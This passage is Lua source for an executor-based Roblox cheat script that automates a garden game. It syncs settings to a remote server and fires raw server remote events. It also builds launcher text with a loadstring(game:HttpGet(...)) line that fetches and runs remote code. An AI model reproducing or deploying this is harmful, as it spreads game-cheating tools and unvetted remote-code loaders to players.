			if type(Z) == "string" and Z:match("^[%a_][%w_]*$") then
				j = Z
			else
				j = string.format("[%s]", a.Config.ToLua(Z, 0))
			end
			table.insert(c, string.format("%s%s = %s,", i, j, a.Config.ToLua(G[Z], V + 1)))
		end
		table.insert(c, j .. "}")
		return table.concat(c, "\n")
	end,
	CopyTable = function(G)
		if type(G) ~= "table" then
			return G
		end
		local V = {}
		for G, y in pairs(G) do
			V[G] = a.Config.CopyTable(y)
		end
		return V
	end,
	Merge = function(G, V, y)
		if type(G) ~= "table" or type(V) ~= "table" then
			return false
		end
		for V, Z in pairs(V) do
			local j = G[V]
			if y and j == nil then
				continue
			end
			if type(j) == "table" and type(Z) == "table" then
				a.Config.Merge(j, Z, false)
			elseif j == nil or type(j) == type(Z) then
				G[V] = a.Config.CopyTable(Z)
			end
		end
		return true
	end;
	ApplyOverride = function()
		if not a.Config.OverrideEnabled then
			return false
		end
		local G = {}
		for V in pairs(a.Config.OnlineExcluded) do
			G[V] = a.Config.CopyTable(h[V])
		end
		local V = a.Config.Merge(h, B, true)
		for G, V in pairs(G) do
			h[G] = V
		end
		return V
	end,
	GetCopyData = function()
		local G = {}
		for V, y in pairs(h) do
			if not a.Config.Excluded[V] then
				G[V] = y
			end
		end
		return G
	end,
	GetOnlineData = function()
		local G = {}
		for V, y in pairs(h) do
			if not a.Config.OnlineExcluded[V] then
				G[V] = a.Config.CopyTable(y)
			end
		end
		return G
	end,
	ApplyRuntimeGlobalOption = function(G)
		local V = l[G]
		local y = h[G]
		if V == nil or y == nil then
			return false
		end
		if type(y) == "number" then
			local Z = tonumber(V)
			if Z == nil or y == Z then
				return false
			end
			h[G] = Z
			return true
		end
		if type(y) == "boolean" then
			if type(V) ~= "boolean" or y == V then
				return false
			end
			h[G] = V
			return true
		end
		if type(y) == "string" then
			if type(V) ~= "string" then
				return false
			end
			V = V:match("^%s*(.-)%s*$") or ""
			if V == "" or y == V then
				return false
			end
			h[G] = V
			return true
		end
		if type(y) == "table" then
			if type(V) ~= "table" or next(V) == nil then
				return false
			end
			h[G] = a.Config.CopyTable(V)
			return true
		end
		return false
	end;
	ApplyRuntimeGlobalOptions = function()
		local G = false
		local V = {
			"web_api_key";
			"webhook_url",
			"webhook_enabled",
			"total_control_enabled",
			"farm_default_placement";
			"mail_auto_accept";
			"server_project_kick_public";
			"smart_seed_progression_prevent_placement_seeds",
			"smart_seed_progression_prevent_shovel_plants";
			"smart_seed_progression_mutation_seeds_enabled",
			"smart_seed_progression_prevent_shovel_rarity",
			"mail_auto_send_enabled";
			"mail_auto_batch_together",
			"remove_plants",
			"remove_weather_visuals";
			"full_performance_mode"
		}
		for V, y in ipairs(V) do
			if a.Config.ApplyRuntimeGlobalOption(y) then
				G = true
			end
		end
		return G
	end;
	ApplyRuntimeSyncOptions = function()
		local G = a.Config.ApplyRuntimeGlobalOptions()
		if l.share_code ~= nil then
			local V = ((tostring(l.share_code or "")):gsub("%s+", "")):lower()
			if V ~= tostring(h.save_sync_share_code or "") then
				h.save_sync_share_code = V
				h.save_sync_pull_revision = 0
				h.save_sync_pull_hash = ""
				G = true
			end
		end
		if l.share_autosync ~= nil then
			local V = l.share_autosync == true
			if h.save_sync_auto_pull_enabled ~= V then
				h.save_sync_auto_pull_enabled = V
				G = true
			end
		end
		if h.save_sync_is_debug ~= nil then
			h.save_sync_is_debug = nil
			G = true
		end
		if g.SaveSyncPremiumAtStartup ~= true then
			if h.save_sync_online_enabled == true then
				h.save_sync_online_enabled = false
				G = true
			end
			if h.save_sync_auto_pull_enabled == true then
				h.save_sync_auto_pull_enabled = false
				G = true
			end
		end
		return G
	end;
	BuildCopyText = function()
		local G = a.Config.GetCopyData()
		if type(G) ~= "table" then
			return nil
		end
		local V, y = pcall(function()
			return "getgenv().gag2_config = " .. a.Config.ToLua(G, 0)
		end)
		if not V then
			return nil
		end
		return y
	end,
	BuildCopyWithLoaderText = function()
		local G = a.Config.BuildCopyText()
		if type(G) ~= "string" or G == "" then
			return nil
		end
		return table.concat({
			"getgenv().mode = \"noui\"";
			"getgenv().exo_key = \"YOUR_KEY\"";
			"getgenv().share_code = \"YOUR_SHARE_CODE\"";
			"getgenv().share_autosync = true",
			"";
			G;
			"",
			"loadstring(game:HttpGet(\"https://exotichub.app/auto.lua\"))()"
		}, "\n")
	end,
	BuildShareLauncherText = function()
		local G = (tostring(h.save_sync_own_share_code or "")):gsub("%s+", "")
		if G == "" then
			G = "YOUR_SHARE_CODE"
		end
		return table.concat({
			"-- Enter your key here.",
			"getgenv().exo_key = \"YOUR_KEY\"",
			"";
			"-- optional";
			"getgenv().mode = \"noui\"",
			"",
			"-- Enter the share code shown on your main account.",
			"getgenv().share_code = \"" .. (G .. "\""),
			"-- Keep it enabled to continue to get lastest sync data from your main account.",
			"getgenv().share_autosync = true",
			"",
			"loadstring(game:HttpGet(\"https://exotichub.app/auto.lua\"))()"
		}, "\n")
	end
}
a.Save = {
	RequireSave = false,
	SaveData = function(G)
		if a.Config.OverrideEnabled then
			return false
		end
		if G then
			a.Save.SaveDataSync()
			return
		end
		a.Save.RequireSave = true
	end;
	LoadData = function()
		if not isfile(m) then
			return
		end
		local G = readfile(m)
		if not G or G == "" then
			return
		end
		local V, Z = pcall(y.HttpService.JSONDecode, y.HttpService, G)
		if not V then
			return
		end
		local function j(G, V)
			for V, y in pairs(V) do
				local Z = G[V]
				if type(y) == "table" and type(Z) == "table" then
					j(Z, y)
				else
					G[V] = y
				end
			end
			return G
		end
		j(h, Z)
	end,
	SaveDataSync = function()
		if a.Config.OverrideEnabled then
			return false
		end
		local G, V = pcall(function()
			return y.HttpService:JSONEncode(h)
		end)
		if G then
			writefile(m, V)
			return true
		else
			return false
		end
	end,
	SaveLoop = function()
		if a.Config.OverrideEnabled then
			return false
		end
		task.spawn(function()
			while true do
				task.wait(.5)
				if a.Config.OverrideEnabled then
					return false
				end
				if a.Save.RequireSave then
					a.Save.RequireSave = false
					a.Save.SaveDataSync()
				end
			end
		end)
		return false
	end
}
if a.Config.OverrideEnabled then
	a.Config.ApplyOverride()
else
	a.Save.LoadData()
end
if a.Config.ApplyRuntimeSyncOptions() and not a.Config.OverrideEnabled then
	a.Save.SaveDataSync()
end
if h.farm_placement_mode_options_migration_v1 ~= true then
	local G = {
		"seed_place_mode",
		"sprinkler_place_mode";
		"water_plant_mode";
		"friend_garden_care_location_mode",
		"potted_weather_guard_place_mode"
	}
	for G, V in ipairs(G) do
		if h[V] == W.Default then
			h[V] = W.UseDefault
		end
	end
	h.farm_placement_mode_options_migration_v1 = true
	a.Save.SaveDataSync()
end
if h.seed_place_mode == "Farm Corner" then
	h.seed_place_mode = W.UseDefault
	a.Save.SaveDataSync()
end
a.Save.SaveLoop()
local K = false
if h.auto_fruit_unfavourite_enabled ~= nil then
	h.auto_fruit_unfavourite_enabled = nil
	K = true
end
if h.auto_fruit_favourite_managed ~= nil then
	h.auto_fruit_favourite_managed = nil
	K = true
end
if K then
	a.Save.SaveData()
end
g.RollerRemoteActive = false
g.RollerSaveActive = false
g.SetRollerVisual = function(G)
	G = tostring(G or "")
	local V = y.PlayerGui or (y.LocalPlayer and y.LocalPlayer:FindFirstChild("PlayerGui"))
	if G == "" or not V then
		return false
	end
	local Z = V:FindFirstChild("RollerStatusGui")
	if Z then
		Z:Destroy()
	end
	local j = Instance.new("ScreenGui")
	j.Name = "RollerStatusGui"
	j.ResetOnSpawn = false
	j.IgnoreGuiInset = true
	j.DisplayOrder = 2147483647
	j.Parent = V
	local i = Instance.new("TextLabel")
	i.Name = "RollerStatusLabel"
	i.AnchorPoint = Vector2.new(.5, 0)
	i.Position = UDim2.fromScale(.5, .02)
	i.Size = UDim2.fromOffset(300, 48)
	i.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	i.BackgroundTransparency = .3
	i.BorderSizePixel = 0
	i.Text = G
	i.TextColor3 = Color3.fromRGB(255, 255, 255)
	i.TextSize = 22
	i.Font = Enum.Font.GothamBold
	i.Active = false
	i.Parent = j
	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 10)
	c.Parent = i
	return true
end
g.IsRollerSystemActive = function(G)
	if G == "EggHatcher" then
		return h.egg_hatcher_enabled == true and h.egg_hatcher_rejoin_after_hatch == true
	end
	if G == "MutationSeedPlacer" then
		return h.mutation_seed_placer_enabled == true and h.mutation_seed_placer_rejoin == true
	end
	if G == "SeedDropPick" then
		return h.seed_drop_pick_enabled == true
	end
	if G == "FastAuction" then
		return g.GetCheckIfPro() == true and (h.fast_auction_enabled == true and h.fast_auction_rejoin == true)
	end
	if G == "FriendGardenCare" then
		return g.GetCheckIfPro() == true and (h.friend_garden_care_enabled == true and h.friend_garden_care_rejoin == true)
	end
	return G == "Manual"
end
g.Roller = function(G)
	if not g.IsRollerSystemActive(G) then
		return false
	end
	if g.RollerSaveActive == true and G ~= "Manual" then
		return false
	end
	if g.RollerRemoteActive == true then
		g.SetRollerVisual("Roll: Active")
		return true
	end
	y.RemoteEvent:FireServer(54, ":\247")
	g.RollerRemoteActive = true
	g.RollerSaveActive = false
	g.SetRollerVisual("Roll: Active")
	return true
end
g.RollerSave = function(G)
	local V = g.IsRollerSystemActive(G)
	if g.RollerRemoteActive == true then
		V = true
	end
	if not V then
		return false
	end
	y.RemoteEvent:FireServer(54, " ")
	g.RollerRemoteActive = false
	g.RollerSaveActive = true
	g.SetRollerVisual("Roll: Save Active")
	return true
end
local b = {
	k = 1000.0,
	K = 1000.0;
	m = 1000000.0;
	M = 1000000.0,
	b = 1000000000.0;
	B = 1000000000.0,
	t = 1000000000000.0,
	T = 1000000000000.0,
	q = 1e+015;
	Q = 1e+015;
	Qa = 1e+015;
	qi = 1e+018;
	Qi = 1e+018,
	sx = 1e+021,
	Sx = 1e+021,
	sp = 1e+024;
	Sp = 1e+024;
	oc = 1e+027,
	Oc = 1e+027;
	no = 1e+030,
	No = 1e+030;
	dc = 1e+033;
	Dc = 1e+033
}
local S = {
	"k",
	"M",
	"B";
	"T",
	"Qa",
	"Qi";
	"Sx",
	"Sp";
	"Oc";
	"No";
	"Dc"
}
g.Notify = function(G, V)
	G = tostring(G or "")
	if G == "" or not T or type(T.Notify) ~= "function" then
		return false
	end
	return pcall(function()
		T:Notify(G, tonumber(V) or 2.5)
	end)
end
r.Http = {
	GetRequestFunction = function()
		return type(syn) == "table" and syn.request or type(http) == "table" and http.request or type(http_request) == "function" and http_request or type(request) == "function" and request or type(fluxus) == "table" and fluxus.request or type(krnl) == "table" and krnl.request
	end,
	PostJson = function(G, V)
		if type(G) ~= "string" or G == "" or type(V) ~= "table" then
			return false, 0, "", "Invalid request"
		end
		local Z, j = pcall(y.HttpService.JSONEncode, y.HttpService, V)
		if not Z or type(j) ~= "string" then
			return false, 0, "", "Failed to encode request"
		end
		local i, c = pcall(function()
			local V = r.Http.GetRequestFunction()
			if type(V) == "function" then
				return V({
					Url = G;
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/json",
						Accept = "application/json"
					};
					Body = j
				})
			end
			local Z = y.HttpService:PostAsync(G, j, Enum.HttpContentType.ApplicationJson)
			return {
				StatusCode = 200;
				Body = Z
			}
		end)
		if not i or type(c) ~= "table" then
			return false, 0, "", tostring(c or "Request failed")
		end
		local J = tonumber(c.StatusCode or c.Status or c.status_code) or 0
		local T = c.Body or c.body or ""
		T = type(T) == "string" and T or tostring(T or "")
		if J == 0 and T ~= "" then
			J = 200
		end
		local d = J >= 200 and J < 300
		local u = nil
		if not d then
			u = "HTTP " .. tostring(J)
		end
		return d, J, T, u
	end
}
g.SaveSyncStatusText = ""
g.TotalControlStatusText = ""
Z.SaveSync = {
	PushUrlSaveSync = "https://exotichub.app/push-data";
	PullUrlSaveSync = "https://exotichub.app/pull-sync";
	GameKeySaveSync = "gag2",
	StartedSaveSync = false,
	PushBusySaveSync = false,
	PullBusySaveSync = false;
	LastEncodedSaveSync = "";
	LastOwnPullRevisionSaveSync = 0,
	SetStatusSaveSync = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.SaveSyncStatusText = ""
			return false
		end
		g.SaveSyncStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\226\152\129\239\184\143 [Save Sync]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end;
	DebugSaveSync = function(G, V)
		if g.SaveSyncDebugEnabled ~= true then
			return false
		end
		warn("[SaveSync] " .. tostring(G or "debug"))
		if V ~= nil then
			local G, Z = pcall(y.HttpService.JSONEncode, y.HttpService, V)
			warn("[SaveSyncData] " .. tostring(G and Z or V))
		end
		return true
	end;
	IsPremiumSaveSync = function()
		return g.SaveSyncPremiumAtStartup == true
	end;
	DisableNonPremiumSaveSync = function(G)
		local V = false
		if h.save_sync_online_enabled == true then
			h.save_sync_online_enabled = false
			V = true
		end
		if h.save_sync_auto_pull_enabled == true then
			h.save_sync_auto_pull_enabled = false
			V = true
		end
		if V and a.Config.OverrideEnabled ~= true then
			a.Save.SaveDataSync()
		end
		Z.SaveSync.SetStatusSaveSync(tostring(G or "Premium required for online save"), "#FF6666")
		Z.SaveSync.RefreshUiSaveSync()
		return false
	end,
	GuardPremiumSaveSync = function(G)
		return true
	end,
	CleanShareCodeSaveSync = function(G)
		G = tostring(G or "")
		G = G:gsub("%s+", "")
		return G:lower()
	end;
	DecodeResponseSaveSync = function(G)
		if type(G) ~= "string" or G == "" then
			return nil
		end
		local V, Z = pcall(y.HttpService.JSONDecode, y.HttpService, G)
		if not V or type(Z) ~= "table" then
			return nil
		end
		return Z
	end;
	BuildBasePayloadSaveSync = function()
		local G = y.LocalPlayer
		return {
			profile_id = tostring(g.player_userid or G and G.UserId or "");
			username = tostring(G and G.Name or "");
			game_key = Z.SaveSync.GameKeySaveSync
		}
	end;
	RefreshUiSaveSync = function()
		local G = g.SaveSyncUiRefs
		if type(G) ~= "table" then
			return false
		end
		if G.CodeLabel and type(G.CodeLabel.SetText) == "function" then
			local V = tostring(h.save_sync_own_share_code or "")
			G.CodeLabel:SetText(V ~= "" and "Your code: <font color=\'#7CFC00\'>" .. (V .. "</font>") or "Your code: <font color=\'#FFCC66\'>Enable Save Online to create one</font>")
		end
		local V = g.SaveSyncStatusText ~= "" and g.SaveSyncStatusText or "<font color=\'#888888\'>Ready</font>"
		if G.SaveOnlineStatusLabel and type(G.SaveOnlineStatusLabel.SetText) == "function" then
			G.SaveOnlineStatusLabel:SetText(V)
		end
		if G.RealtimeSyncStatusLabel and type(G.RealtimeSyncStatusLabel.SetText) == "function" then
			G.RealtimeSyncStatusLabel:SetText(V)
		end
		if G.ShareCodeLabel and type(G.ShareCodeLabel.SetText) == "function" then
			local V = tostring(h.save_sync_share_code or "")
			G.ShareCodeLabel:SetText(V ~= "" and "Saved sync code: <font color=\'#7CFC00\'>" .. (V .. "</font>") or "No sync code saved. Type a code and press Enter to save it.")
		end
		return true
	end,
	ApplySettingsSaveSync = function(G, V)
		if type(G) ~= "table" then
			Z.SaveSync.SetStatusSaveSync("Invalid saved data", "#FF6666")
			return false
		end
		local y = {}
		for G in pairs(a.Config.OnlineExcluded) do
			y[G] = a.Config.CopyTable(h[G])
		end
		for G, V in pairs(G) do
			local y = h[G]
			if y == nil then
				continue
			end
			if type(y) == type(V) then
				h[G] = a.Config.CopyTable(V)
			end
		end
		for G, V in pairs(y) do
			h[G] = V
		end
		a.Save.SaveDataSync()
		Z.SaveSync.SetStatusSaveSync(V == "own" and "Loaded online save" or "Applied synced settings", "#7CFC00")
		Z.SaveSync.RefreshUiSaveSync()
		return true
	end;
	SendPushSaveSync = function(G)
		if not Z.SaveSync.GuardPremiumSaveSync("Premium required for online saving") then
			return false, "Premium required"
		end
		if Z.SaveSync.PushBusySaveSync then
			return false, "Save request already running"
		end
		if a.Config.OverrideEnabled then
			return false, "Config override active"
		end
		local V = a.Config.GetOnlineData()
		local j, i = pcall(y.HttpService.JSONEncode, y.HttpService, V)
		if not j or type(i) ~= "string" then
			Z.SaveSync.SetStatusSaveSync("Could not prepare save", "#FF6666")
			return false, "Could not prepare save"
		end
		if tostring(G or "") ~= "manual" and i == Z.SaveSync.LastEncodedSaveSync then
			Z.SaveSync.SetStatusSaveSync("Waiting for changes", "#CFCFCF")
			Z.SaveSync.RefreshUiSaveSync()
			return true, "No changes"
		end
		local c = Z.SaveSync.BuildBasePayloadSaveSync()
		c.base_revision = tonumber(h.save_sync_own_revision) or 0
		c.json_data = V
		Z.SaveSync.PushBusySaveSync = true
		Z.SaveSync.SetStatusSaveSync("Saving online...", "#FFCC66")
		Z.SaveSync.DebugSaveSync("push request", c)
		local J, T, d, u = r.Http.PostJson(Z.SaveSync.PushUrlSaveSync, c)
		Z.SaveSync.PushBusySaveSync = false
		Z.SaveSync.DebugSaveSync("push response " .. tostring(T), d)
		local q = Z.SaveSync.DecodeResponseSaveSync(d)
		if not J and type(q) ~= "table" then
			Z.SaveSync.SetStatusSaveSync(tostring(u or "Save request failed"), "#FF6666")
			Z.SaveSync.RefreshUiSaveSync()
			return false, u or "Save request failed"
		end
		if type(q) ~= "table" then
			Z.SaveSync.SetStatusSaveSync("Invalid save response", "#FF6666")
			Z.SaveSync.RefreshUiSaveSync()
			return false, "Invalid save response"
		end
		if q.success == true then
			h.save_sync_own_share_code = tostring(q.share_code or h.save_sync_own_share_code or "")
			h.save_sync_own_revision = tonumber(q.revision) or tonumber(h.save_sync_own_revision) or 0
			h.save_sync_last_hash = tostring(q.save_hash or h.save_sync_last_hash or "")
			Z.SaveSync.LastEncodedSaveSync = i
			a.Save.SaveDataSync()
			Z.SaveSync.SetStatusSaveSync(q.changed == false and "Online save is up to date" or "Saved online", "#7CFC00")
			Z.SaveSync.RefreshUiSaveSync()
			return true, "Saved online", q
		end
		if q.conflict == true then
			h.save_sync_own_revision = tonumber(q.server_revision) or tonumber(h.save_sync_own_revision) or 0
			a.Save.SaveDataSync()
			Z.SaveSync.SetStatusSaveSync("Online save is newer. Load it first.", "#FF6666")
			Z.SaveSync.RefreshUiSaveSync()
			return false, "Conflict", q
		end
		local g = tostring(q.msg or q.message or "Save failed")
		Z.SaveSync.SetStatusSaveSync(g, "#FF6666")
		Z.SaveSync.RefreshUiSaveSync()
		return false, g, q
	end,
	PullSaveSync = function(G, V)
		if not Z.SaveSync.GuardPremiumSaveSync("Premium required for online sync") then
			return false, "Premium required"
		end
		if Z.SaveSync.PullBusySaveSync then
			return false, "Sync request already running"
		end
		if a.Config.OverrideEnabled then
			return false, "Config override active"
		end
		G = Z.SaveSync.CleanShareCodeSaveSync(G)
		local y = Z.SaveSync.BuildBasePayloadSaveSync()
		y.share_code = G
		y.local_revision = V == true and 0 or (G ~= "" and ((tonumber(h.save_sync_pull_revision) or 0)) or Z.SaveSync.LastOwnPullRevisionSaveSync)
		Z.SaveSync.PullBusySaveSync = true
		Z.SaveSync.SetStatusSaveSync(G == "" and "Loading online save..." or "Checking synced save...", "#FFCC66")
		Z.SaveSync.DebugSaveSync("pull request", y)
		local j, i, c, J = r.Http.PostJson(Z.SaveSync.PullUrlSaveSync, y)
		Z.SaveSync.PullBusySaveSync = false
		Z.SaveSync.DebugSaveSync("pull response " .. tostring(i), c)
		local T = Z.SaveSync.DecodeResponseSaveSync(c)
		if not j and type(T) ~= "table" then
			Z.SaveSync.SetStatusSaveSync(tostring(J or "Sync request failed"), "#FF6666")
			Z.SaveSync.RefreshUiSaveSync()
			return false, J or "Sync request failed"
		end
		if type(T) ~= "table" then
			Z.SaveSync.SetStatusSaveSync("Invalid sync response", "#FF6666")
			Z.SaveSync.RefreshUiSaveSync()
			return false, "Invalid sync response"
		end
		if T.success ~= true then
			local G = tostring(T.msg or T.message or "No saved data found")
			Z.SaveSync.SetStatusSaveSync(G, T.found == false and "#FFCC66" or "#FF6666")
			Z.SaveSync.RefreshUiSaveSync()
			return false, G, T
		end
		local d = tonumber(T.revision) or 0
		if T.changed == false and V ~= true then
			Z.SaveSync.SetStatusSaveSync("Synced save is up to date", "#CFCFCF")
			Z.SaveSync.RefreshUiSaveSync()
			return true, "No changes", T
		end
		if type(T.json_data) ~= "table" then
			Z.SaveSync.SetStatusSaveSync("No saved data to apply", "#FFCC66")
			Z.SaveSync.RefreshUiSaveSync()
			return false, "No saved data to apply", T
		end
		local u = Z.SaveSync.ApplySettingsSaveSync(T.json_data, G == "" and "own" or "shared")
		if u then
			if G == "" then
				h.save_sync_own_share_code = tostring(T.share_code or h.save_sync_own_share_code or "")
				h.save_sync_own_revision = d
				Z.SaveSync.LastOwnPullRevisionSaveSync = d
			else
				h.save_sync_pull_revision = d
				h.save_sync_pull_hash = tostring(T.save_hash or "")
			end
			a.Save.SaveDataSync()
			Z.SaveSync.RefreshUiSaveSync()
		end
		return u, u and "Applied" or "Apply failed", T
	end,
	StartSaveSync = function()
		if not Z.SaveSync.IsPremiumSaveSync() then
			if h.save_sync_online_enabled == true or h.save_sync_auto_pull_enabled == true then
				Z.SaveSync.DisableNonPremiumSaveSync("Premium required for online save")
			end
			return false
		end
		if Z.SaveSync.StartedSaveSync then
			return false
		end
		Z.SaveSync.StartedSaveSync = true
		task.spawn(function()
			task.wait(3)
			while Z.SaveSync.StartedSaveSync and not g.is_forced_stop do
				if h.save_sync_online_enabled == true then
					local G, V = pcall(function()
						Z.SaveSync.SendPushSaveSync("loop")
					end)
					if not G then
						warn("[SaveSyncPush]", V)
						Z.SaveSync.SetStatusSaveSync("Save loop error", "#FF6666")
					end
				end
				task.wait(10)
			end
		end)
		task.spawn(function()
			task.wait(5)
			while Z.SaveSync.StartedSaveSync and not g.is_forced_stop do
				if h.save_sync_auto_pull_enabled == true then
					local G = Z.SaveSync.CleanShareCodeSaveSync(h.save_sync_share_code)
					if G ~= "" then
						local V, y = pcall(function()
							Z.SaveSync.PullSaveSync(G, false)
						end)
						if not V then
							warn("[SaveSyncPull]", y)
							Z.SaveSync.SetStatusSaveSync("Sync loop error", "#FF6666")
						end
					else
						Z.SaveSync.SetStatusSaveSync("Enter a share code", "#FFCC66")
						Z.SaveSync.RefreshUiSaveSync()
					end
				end
				task.wait(math.random(9, 20))
			end
		end)
		return true
	end
}
Z.WebApi = {
	Url = "";
	Busy = false;
	LinkDevice = function()
		if Z.WebApi.Busy then
			return false, "Link request already running"
		end
		local G = (tostring(h.web_api_key or "")):match("^%s*(.-)%s*$")
		local V = tostring(y.LocalPlayer and y.LocalPlayer.Name or "")
		local j = tostring(y.LocalPlayer and y.LocalPlayer.UserId or "")
		if G == "" then
			return false, "Enter your Web API key first"
		end
		if V == "" or j == "" then
			return false, "Account data is unavailable"
		end
		Z.WebApi.Busy = true
		local i, c = pcall(function()
			local i = y.HttpService:JSONEncode({
				webapi = G,
				un = V;
				pid = j
			})
			local c = type(syn) == "table" and syn.request or type(http) == "table" and http.request or type(http_request) == "function" and http_request or type(request) == "function" and request or type(fluxus) == "table" and fluxus.request or type(krnl) == "table" and krnl.request
			if type(c) == "function" then
				local G = c({
					Url = Z.WebApi.Url,
					Method = "POST";
					Headers = {
						["Content-Type"] = "application/json"
					};
					Body = i
				})
				if type(G) ~= "table" then
					error("Invalid request response")
				end
				return G.Body or G.body or ""
			end
			return y.HttpService:PostAsync(Z.WebApi.Url, i, Enum.HttpContentType.ApplicationJson)
		end)
		Z.WebApi.Busy = false
		if not i or type(c) ~= "string" or c == "" then
			return false, "Device link request failed"
		end
		local J, T = pcall(y.HttpService.JSONDecode, y.HttpService, c)
		if not J or type(T) ~= "table" then
			return false, "Invalid server response"
		end
		local d = tostring(T.msg or T.message or "Unknown response")
		if T.success == true then
			return true, d, T
		end
		return false, d, T
	end;
	AutoLinkSavedWebApi = function()
		local G = (tostring(h.web_api_key or "")):match("^%s*(.-)%s*$")
		if G == "" then
			return false
		end
		task.spawn(function()
			task.wait(3)
			Z.WebApi.LinkDevice()
		end)
		return true
	end
}
Z.WebApi.AutoLinkSavedWebApi()
Z.PlantVisualBlocker = {
	StartedPlantVisualBlocker = false,
	OriginalSpawnPlantFromDataPlantVisualBlocker = nil;
	OriginalSpawnFruitFromDataPlantVisualBlocker = nil,
	FullCleanUntilPlantVisualBlocker = 0;
	IsEnabledPlantVisualBlocker = function()
		if h.full_performance_mode == true then
			return true
		end
		return h.remove_plants
	end,
	SetStatusPlantVisualBlocker = function(G, V)
		g.PlantVisualBlockerStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\140\177 [Plant Visuals]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), tostring(G or ""))
	end;
	MarkFullCleanPlantVisualBlocker = function(G)
		Z.PlantVisualBlocker.FullCleanUntilPlantVisualBlocker = os.clock() + math.max(tonumber(G) or 10, 1)
	end;
	GetPlantVisualIdsPlantVisualBlocker = function(G)
		if typeof(G) ~= "Instance" then
			return nil, nil
		end
		local V = G:GetAttribute("UserId")
		local y = G:GetAttribute("PlantId")
		if V ~= nil and y ~= nil then
			return V, y
		end
		local Z, j = (tostring(G.Name or "")):match("^([^_]+)_(.+)$")
		return Z, j
	end,
	GetFruitVisualIdsPlantVisualBlocker = function(G, V, y)
		if typeof(G) ~= "Instance" then
			return nil, nil, nil
		end
		local Z = G:GetAttribute("UserId")
		local j = G:GetAttribute("PlantId")
		local i = G:GetAttribute("FruitId")
		if Z == nil then
			Z = V
		end
		if j == nil then
			j = y
		end
		if i ~= nil then
			return Z, j, i
		end
		local c, J, T = (tostring(G.Name or "")):match("^([^_]+)_([^_]+)_(.+)$")
		if Z == nil then
			Z = c
		end
		if j == nil then
			j = J
		end
		return Z, j, T
	end;
	RemoveFruitVisualPlantVisualBlocker = function(G, V, Z, j)
		local i = y.FruitVisualizerController
		if type(i) == "table" and (type(i.RemoveFruitById) == "function" and (G ~= nil and (V ~= nil and Z ~= nil))) then
			pcall(function()
				i:RemoveFruitById(G, V, Z)
			end)
		end
		if typeof(j) == "Instance" and j.Parent then
			pcall(function()
				j:Destroy()
			end)
		end
		return true
	end,
	RemovePlantVisualPlantVisualBlocker = function(G, V, j)
		local i = y.PlantVisualizerController
		local c = y.FruitVisualizerController
		if typeof(j) == "Instance" and j.Parent then
			local y = j:FindFirstChild("Fruits")
			if y then
				for y, j in ipairs(y:GetChildren()) do
					local i, c, J = Z.PlantVisualBlocker.GetFruitVisualIdsPlantVisualBlocker(j, G, V)
					Z.PlantVisualBlocker.RemoveFruitVisualPlantVisualBlocker(i, c, J, j)
				end
			end
		end
		if type(i) == "table" and (type(i.RemovePlantById) == "function" and (G ~= nil and V ~= nil)) then
			pcall(function()
				i:RemovePlantById(G, V)
			end)
		end
		if typeof(j) == "Instance" and j.Parent then
			pcall(function()
				j:Destroy()
			end)
		end
		return true
	end;
	ClearSyncedVisualsPlantVisualBlocker = function()
		if not Z.PlantVisualBlocker.IsEnabledPlantVisualBlocker() then
			return false
		end
		local G = y.GardenSyncController
		if type(G) ~= "table" or type(G.GetAllGardens) ~= "function" then
			return false
		end
		local V = G:GetAllGardens()
		if type(V) ~= "table" then
			return false
		end
		local j = 0
		for G, V in pairs(V) do
			if not Z.PlantVisualBlocker.IsEnabledPlantVisualBlocker() then
				break
			end
			if type(V) ~= "table" then
				continue
			end
			for V, y in pairs(V) do
				if not Z.PlantVisualBlocker.IsEnabledPlantVisualBlocker() then
					break
				end
				if type(y) == "table" and type(y.Fruits) == "table" then
					for y in pairs(y.Fruits) do
						Z.PlantVisualBlocker.RemoveFruitVisualPlantVisualBlocker(G, V, y, nil)
					end
				end
				Z.PlantVisualBlocker.RemovePlantVisualPlantVisualBlocker(G, V, nil)
				j += 1
				if j % 75 == 0 then
					task.wait()
				end
			end
		end
		return true
	end;
	ClearWorkspaceVisualsPlantVisualBlocker = function()
		if not Z.PlantVisualBlocker.IsEnabledPlantVisualBlocker() then
			return false
		end
		local G = y.Workspace:FindFirstChild("Gardens")
		if not G then
			return false
		end
		local V = 0
		for G, y in ipairs(G:GetChildren()) do
			if not Z.PlantVisualBlocker.IsEnabledPlantVisualBlocker() then
				break
			end
			local j = y:FindFirstChild("Plants")
			if not j then
				continue
			end
			for G, y in ipairs(j:GetChildren()) do
				if not Z.PlantVisualBlocker.IsEnabledPlantVisualBlocker() then
					break
				end
				local j, i = Z.PlantVisualBlocker.GetPlantVisualIdsPlantVisualBlocker(y)
				Z.PlantVisualBlocker.RemovePlantVisualPlantVisualBlocker(j, i, y)
				V += 1
				if V % 50 == 0 then
					task.wait()
				end
			end
		end
		return true
	end;
	ClearTemporaryVisualsPlantVisualBlocker = function()
		if not Z.PlantVisualBlocker.IsEnabledPlantVisualBlocker() then
			return false
		end
		local G = y.Workspace:FindFirstChild("Temporary")
		if not G then
			return false
		end
		local V = 0
		for G, y in ipairs(G:GetChildren()) do
			if not Z.PlantVisualBlocker.IsEnabledPlantVisualBlocker() then
				break
			end
			if y and y.Name == "Dirt" then
				y:Destroy()
				V += 1
			end
			if V % 50 == 0 then
				task.wait()
			end
		end
		return V > 0
	end,
	ClearAllVisualsPlantVisualBlocker = function(G)
		if not Z.PlantVisualBlocker.IsEnabledPlantVisualBlocker() then
			return false
		end
		if G == true then
			Z.PlantVisualBlocker.ClearSyncedVisualsPlantVisualBlocker()
		end
		Z.PlantVisualBlocker.ClearWorkspaceVisualsPlantVisualBlocker()
		Z.PlantVisualBlocker.ClearTemporaryVisualsPlantVisualBlocker()
		Z.PlantVisualBlocker.SetStatusPlantVisualBlocker("Blocked", "#7CFC00")
		return true
	end;
	RequestVisualRefreshPlantVisualBlocker = function()
		local G = y.GardenSyncController
		if type(G) == "table" and type(G.ReconcileLocalGarden) == "function" then
			pcall(function()
				G:ReconcileLocalGarden()
			end)
		end
